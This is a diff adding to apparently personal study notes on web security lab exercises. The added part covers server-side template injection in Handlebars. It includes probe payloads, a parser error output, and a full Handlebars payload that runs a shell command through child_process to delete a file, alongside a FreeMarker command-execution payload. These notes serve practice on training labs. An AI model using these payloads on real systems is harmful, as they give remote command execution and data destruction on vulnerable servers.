@@ -3192,7 +3192,40 @@ LLM -> API: create_email_forwarding_rule('peter')
   - Exploit and remove carlos file
     `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt")}`
 - Server-side template injection in an unknown language with a **documented exploit**
-  - 
+  - Probe for SSTI evaluation
+    Intruder > GET /?message=Unfo§rtunately%20this%20product%20is%20out%20of%20stock§ > discover handlerbars (NodeJS) template
+    ```
+    payload list:
+    {{7*7}}
+    ${7*7}
+    <%=7*7%>
+    ${{7*7}}
+    #{7*7}
+    ```
+    "/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/**handlebars**/compiler/parser.js:267 throw new Error(str); ^ Error: Parse error on line 1: Unfo{{7*7}} ------^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseErro"
+  - Search the web for "Handlebars server-side template injection". You should find a well-known exploit posted by @Zombiehelp54
+    ```
+    wrtz{{#with "s" as |string|}}
+	    {{#with "e"}}
+	        {{#with split as |conslist|}}
+	            {{this.pop}}
+	            {{this.push (lookup string.sub "constructor")}}
+	            {{this.pop}}
+	            {{#with string.split as |codelist|}}
+	                {{this.pop}}
+	                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+	                {{this.pop}}
+	                {{#each conslist}}
+	                    {{#with (string.sub.apply 0 codelist)}}
+	                        {{this}}
+	                    {{/with}}
+	                {{/each}}
+	            {{/with}}
+	        {{/with}}
+	    {{/with}}
+	{{/with}}
+    ```
+ - rm command to remove carlos file: https://YOUR-LAB-ID.web-security-academy.net/?message=<URL Encode PAYLOAD> 
 - dd
 - dd
   
